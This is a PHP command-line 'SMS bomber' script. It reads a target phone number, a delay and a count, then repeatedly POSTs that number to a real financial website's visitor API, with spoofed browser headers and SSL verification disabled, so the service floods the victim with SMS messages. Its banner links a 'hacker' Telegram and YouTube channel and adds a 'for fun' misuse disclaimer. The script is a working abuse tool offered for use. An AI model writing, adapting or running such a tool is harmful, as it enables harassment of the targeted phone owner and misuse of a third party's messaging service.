
<?php
/* *SMS BOMBER V 0.1 BY TECHNCYBER.COM * */
/* A simple Bomber By Basudev */
/* Use it For Fun */


 function userinput($message){
    global $orange, $bold, $greenbg, $redbg, $bluebg, $cln, $lblue, $fgreen;
    $inputstyle = $cln .$bold .$red. "[i] " . $message . ": " . $fgreen;
  echo $inputstyle;
  }

$white = "\e[97m";
$black = "\e[30m\e[1m";
$yellow = "\e[93m";
$orange = "\e[38;5;208m";
$blue   = "\e[34m";
$lblue  = "\e[36m";
$cln    = "\e[0m";
$green  = "\e[92m";
$fgreen = "\e[32m";
$red    = "\e[91m";
$magenta = "\e[35m";
$bluebg = "\e[44m";
$lbluebg = "\e[106m";
$greenbg  = "\e[42m";
$lgreenbg  = "\e[102m";
$yellowbg  = "\e[43m";
$lyellowbg = "\e[103m";
$redbg = "\e[101m";
$grey = "\e[37m";
$cyan = "\e[36m";
$bold  = "\e[1m";


/*Testing SMS Bomber Script

*Touching Php After a long time

* php is almost Empty in my Mind

*recently I have mastered php curl still confusing 

Writing Comments in Programming is a funny Part 
*/
error_reporting(0);
    
    
function bomberfunc($no, $stop, $delay)
    
{
// Creating a variable x and giving it an intiger  value 0

$x = 0;
while($x < $stop)

 {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api2.paisabazaar.com/BSP/api/v1/visitor");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"visitId\":\"xxxxxxxx-2a35-4003-a03c-83d075622687\",\"mobileNumber\":\"$no\"}");
        curl_setopt($ch, CURLOPT_POST, 1);
     
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $headers   = array();
        $headers[] = "Host: api2.paisabazaar.com";
       // Error May Occur Here Keep Testing
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0";
        $headers[] = "Accept: application/json, text/plain, */*";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Accept-Encoding: gzip, deflate";
        $headers[] = "Referer: https://creditreport.paisabazaar.com/bureau/login?utm_source=pb_header_signin_veto";
        $headers[] = "Content-Type: application/json;charset=utf-8";
        $headers[] = "Content-Length: 78";
        $headers[] = "Origin: https://creditreport.paisabazaar.com";
        $headers[] = "Connection: close";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error: Something Went Wrong..!!!\n" /*'Error:'. curl_error($ch)*/;
        }
        curl_close($ch);
    sleep($delay);
        $x++;
        flush();
    }

    }

echo $bold .$orange. "____________________ 
     ║▒▒▒▒▒▒▒▒▒▒║
     ║▒▒▒▒▒▒▒▒▒▒║
     ║▒▒▒▒▒▒▒▒▒▒║
     ║▒▒▒▒▒▒▒▒▒▒║
     ║▒▒▒▒▒▒▒▒▒▒║
     ║▒▒▒▒▒▒▒▒▒▒║
    ╔════════════╗
    ╚════════════╝
     ║██████████╚╗
     ║██╔══╗█╔═╗█║
     ║██║╬╔╝█╚╗║█║
     ║██╚═╝█║█╚╝█║
     ╚╗█████████═╝
     ╚╗║╠╩╩╩╩╩╝
        ║║┈┈┈█▐█████▒.｡oO
        ║██╠╦╦╦╗
        ╚╗██████
           ╚════╝\n";
echo $bold .$red."Telegram⇝:https://t.me/Termux_DZ_Hacker\n";
echo $bold .$red."youtube ⇝: https://youtube.com/channel/UCt8pMJ2iq9WNPEGtD5YCvfg\n";

echo " \n";

echo $bold .$red."Disclaimer : \n";
echo $yellow."This Tool Is For Fun

The Developer Will Not Be Responsible For Any Misuse Of This Tool\n";
echo "\n";
userinput("Enter Phone Number");

$no = trim(fgets(STDIN));

echo " \n";

userinput("Enter Bomb delay In seconds");


$delay = trim(fgets(STDIN));

echo "\n";

userinput ("Enter The Number Of SMS to Send");

$stop = trim(fgets(STDIN));

$execute = bomberfunc($no, $stop, $delay);

print $execute;

echo " \n";
?>